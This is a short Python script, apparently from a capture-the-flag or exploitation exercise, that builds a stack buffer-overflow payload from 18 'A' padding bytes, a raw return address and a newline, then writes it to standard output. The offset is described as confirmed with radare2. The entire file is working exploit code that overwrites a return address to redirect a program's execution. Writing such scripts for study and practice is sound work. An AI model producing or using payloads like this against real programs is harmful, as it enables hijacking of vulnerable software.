import sys

# Your offset, confirmed with radare2.
padding = b'A' * 18

# Your address, as raw bytes, with no extra nulls.
address_bytes = b'\x4f\x52\x55\x55\x55\x55'

# The newline character that echo sends automatically.
newline = b'\n'

# Assemble the payload to be a perfect copy of echo's output.
payload = padding + address_bytes + newline

# Write the raw bytes directly to the output buffer.
sys.stdout.buffer.write(payload)
#AAAAAAAAAAAAAAAAAAORUUUU
